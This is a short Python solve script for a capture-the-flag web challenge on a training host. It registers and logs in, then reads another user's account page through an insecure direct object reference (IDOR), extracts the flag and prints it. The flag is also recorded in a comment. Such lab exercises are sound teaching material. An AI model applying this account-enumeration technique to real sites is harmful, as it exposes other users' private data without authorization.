import requests
import re

site = "http://notes.challs.olicyber.it"
s = requests.session()
data = {"username" : "abcdef",
        "password" : "abcdef"}
reg = s.post(f"{site}/register", data)
log = s.post(f"{site}/login", data)
r = s.get(f"{site}/account/1").text
match = re.search(r'flag\{[^\}]+\}', r)
flag = match.group(0)
print(flag)

#flag{c0ntroll0_acc3s5i_IDOR}